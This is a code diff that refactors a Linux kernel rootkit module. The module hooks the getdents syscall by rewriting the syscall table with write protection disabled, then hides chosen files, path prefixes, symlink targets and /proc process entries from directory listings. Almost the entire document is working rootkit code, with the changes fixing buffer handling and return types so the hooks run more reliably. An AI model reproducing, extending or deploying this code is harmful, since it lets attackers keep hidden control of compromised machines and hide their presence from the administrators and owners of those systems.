@@ -29,7 +29,7 @@
 #include "include.h"
 
 /* pointers to some important kernel functions/resources */
-asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage long (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage ssize_t (*syscall_readlink) (const char *path, char *buf, size_t bufsiz);
 
 /* used to keep track of whether we hooked getdents or not */
@@ -49,33 +49,37 @@ static unsigned long getdents_lock_flags;
  * useful to check each (folder)name if it matches.
  */
 char *
-get_next_level (char *path)
+get_next_level (char *path, int *buflen)
 {
 	char *ptr;
 	char delimiter = '/';
 	
 	/* safety check */
-	if(path == NULL) {
+	if(path == NULL)
 		return NULL;
-	}
-	
+
 	/* get the next occurrence of '/' */
-	ptr = strchr(path, delimiter);
+	ptr = strnchr(path, *buflen, delimiter);
 	
 	/* safety check */
-	if(ptr == NULL) {
+	if(ptr == NULL)
 		return NULL;
-	} else {
+	else {
 		/*
 		 * if it is not the last character
 		 * return the remainder
 		 */
 		if(strlen(ptr) > 1) {
-			return ptr + 1;
-		} else {
-			/* else return NULL */
+			ptr += 1;
+			*buflen -= (int) (ptr - path);
+			if(*buflen < 0) {
+				ROOTKIT_DEBUG("buflen = %i, path = '%s'",
+					*buflen, path);
+				return NULL;
+			}
+			return ptr;
+		} else
 			return NULL;
-		}
 	}
 }
 
@@ -85,12 +89,11 @@ get_next_level (char *path)
  * to check
  */
 int
-check_hide_fpath(char *path)
+check_hide_fpath (char *path)
 {
 	/* safety check */
-	if(path == NULL) {
+	if(path == NULL)
 		return 0;
-	}
 	
 	/* check with the control API if we need to hide it */
 	return is_path_hidden(path);
@@ -101,7 +104,7 @@ check_hide_fpath(char *path)
  * of its prefix
  */
 int
-check_hide_fprefix(char *path)
+check_hide_fprefix (char *path, int *buflen)
 {
 	char *d_name;
 	
@@ -109,26 +112,23 @@ check_hide_fprefix(char *path)
 	struct list_head *cursor;
 	
 	/* safety check */
-	if(path == NULL) {
+	if(path == NULL)
 		return 0;
-	}
 
 	d_name = path;
 	
 	do {
-		
 		/* check each hidden prefix of the control API */
 		list_for_each(cursor, get_prefix_list()) {
 			cur = list_entry(cursor, struct file_prefix, list);
 			
 			/* on match hide the file/folder */
-			if(strstr(d_name, cur->name) == d_name) {
+			if(strstr(d_name, cur->name) == d_name)
 				return 1;
-			}
 		}
 		
 		/* prepare for the next iteration */
-		d_name = get_next_level(d_name);
+		d_name = get_next_level(d_name, buflen);
 		
 	} while (d_name != NULL);
 	
@@ -141,58 +141,70 @@ check_hide_fprefix(char *path)
  * id of a hidden process. fd must match the /proc folder.
  */
 int
-check_hide_process(int fd, char *d_name)
+check_hide_process (int fd, char *d_name)
 {
 	int ret;
-	char dir[128];
+	char *dir;
+	int retv = 0;
+
+	/* allocate memory on the heap */
+	dir = kmalloc(1024, GFP_KERNEL);
 
 	/* use our function to get the path of the folder */
-	ret = get_path(fd, dir, 128);
+	ret = get_path(fd, dir, 1024);
 	
 	/* safety check */
 	if(ret <= 0) {
-		ROOTKIT_DEBUG("Something probably went wrong in check_hide_process().\n");
-		return 0;
+		ROOTKIT_DEBUG("Something probably went wrong in check_hide_process(): ret <= 0\n");
+		goto out;
 	}
 	
 	/* safety check */
 	if(dir == NULL) {
-		return 0;
+		ROOTKIT_DEBUG("Something probably went wrong in check_hide_process(): dir == NULL\n");
+		goto out;
 	}
 	
 	/* check if we are in the /proc directory */
-	if(strcmp(dir, "/proc") == 0) {
+	if(strncmp(dir, "/proc", 5) == 0) {
 		/* check the control API if we need to hide this process */
-		return is_process_hidden(convert_atoi(d_name));
+		retv = is_process_hidden(convert_atoi(d_name));
+		goto out;
 	}
 
-	return 0;
+out:
+	kfree(dir);
+	return retv;
 }
 
 int
-check_hide_loop(char *path)
+check_hide_loop (char *path)
 {
 	mm_segment_t old_fs;
-	char lpath[1024], curpath[1024];
+	char *lpath;
+	char *curpath;
 	ssize_t lpath_len;
-	
-	strncpy(curpath, path, 1024);
-		
-	do {
-		
-		/* safety check */	
-		if(curpath == NULL) {
-			break;
-		}
-		
-		/* check if the current link is pointing to a hidden path */
-		if(check_hide_fpath(curpath)) {
-			return 1;
-		}
+	int retv = 0;
+	int *curpath_len;
 
-		/* check if the current link is pointing to a file with a hiding prefix */
-		if(check_hide_fprefix(curpath)) {
-			return 1;
+        /* allocate memory on the heap */
+	lpath = (char *) kmalloc(sizeof(char)*1024, GFP_KERNEL);
+	curpath = (char *) kmalloc(sizeof(char)*1024, GFP_KERNEL);
+	curpath_len = (int *) kmalloc(sizeof(int), GFP_KERNEL);
+	
+	memset(curpath, 0, 1024);
+	strncpy(curpath, path, 1024);
+	*curpath_len = 1024;
+
+	do {
+		/* safety check */
+		if(curpath == NULL)
+			break;
+		
+		/* check if the current link is pointing to a hidden path or prefix */
+		if(check_hide_fpath(curpath) || check_hide_fprefix(curpath, curpath_len)) {
+			retv = 1;
+			break;
 		}
 
 		/* reset variables */
@@ -215,60 +227,68 @@ check_hide_loop(char *path)
 		strncpy(curpath, lpath, 1024);
 	} while (lpath_len > 0);
 	
-	return 0;
+	/* cleanup and return */
+	kfree(curpath_len);
+	kfree(curpath);
+	kfree(lpath);
+	return retv;
 }
 
 /*
  * Our manipulated getdents syscall. It checks whether a particular file needs to be hidden.
  * If it matches then don't show, otherwise works normally and calls the original getdents.
  */
-asmlinkage int
+asmlinkage long
 manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
 	/* lock and increase the call counter */
 	INCREASE_CALL_COUNTER(getdents_call_counter, &getdents_lock, getdents_lock_flags);
 		
-	long ret;
+	long retv;
 	int len = 0;
 	int tlen = 0;
+	int offset = 0;
 	
-	char path[1024];
+	char *path;
 	ssize_t path_len;
 
+	/* allocate memory on the heap */
+	path = (char *) kmalloc(sizeof(char)*1024, GFP_KERNEL);
+
 	/* call the original function for its output */
-	ret = (*original_getdents) (fd,dirp,count);	
-	tlen = ret;
+	retv = (*original_getdents) (fd, dirp, count);	
+	tlen = retv;
 	
 	/* get the current path and terminate it with a '/' */
 	path_len = get_path(fd, path, 1024);
-	memset(path+path_len, '/', 1);
+	if(path_len > 0 && path[path_len-1] != '/') {
+		memset(path+path_len, '/', 1);
+		offset = 1;
+	}
 	
 	/* loop all entries */
 	while(tlen > 0) {
 		len  = dirp->d_reclen;
-		tlen = tlen-len;
+		tlen = tlen - len;
 		
 		/* append the file/folder name to the path and zero-terminate it */
-		strcpy(path+path_len+1, dirp->d_name);
-		memset(path+path_len + strlen(dirp->d_name) + 1, '\0', 1);
+		strcpy(path+path_len+offset, dirp->d_name);
+		memset(path+path_len+offset+strlen(dirp->d_name), '\0', 1);
 
 		/* check whether we need to hide the file */
 		if(check_hide_process(fd, dirp->d_name)
 				|| check_hide_loop(path)) {
-			
 			/* remove it from the output */
-			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
-			ret -= len;
-			
-		} else if(tlen != 0) {
+			memmove(dirp, (char*)dirp+dirp->d_reclen, tlen);
+			retv -= len;
+		} else if(tlen != 0)
 			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
-		}
-		
 	}
 	
+	kfree(path);
 	/* lock and decrease the call counter */
 	DECREASE_CALL_COUNTER(getdents_call_counter, &getdents_lock, getdents_lock_flags);
-	return ret;
+	return retv;
 }
 
 /*
@@ -291,7 +311,7 @@ hook_getdents(void) {
 
 	/* replace the syscall getdents */
 	original_getdents = (void *) sys_call_table[__NR_getdents];
-	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;
+	sys_call_table[__NR_getdents] = (long *) manipulated_getdents;
 
 	/* reenable write protection */
 	enable_page_protection();
@@ -312,7 +332,7 @@ unhook_getdents(void) {
 	ROOTKIT_DEBUG("Unhooking the getdents syscall...\n");
 	
 	/* only do anything if getdents is actually hooked */
-	if(getdents_hooked < 1) {
+	if(!getdents_hooked) {
 		ROOTKIT_DEBUG("Nothing to do.\n");
 		return;
 	}
@@ -323,7 +343,7 @@ unhook_getdents(void) {
 	disable_page_protection();
 
 	/* restore the old syscall */
-	sys_call_table[__NR_getdents] = (int *) original_getdents;
+	sys_call_table[__NR_getdents] = (long *) original_getdents;
 
 	/* reenable write protection */
 	enable_page_protection();
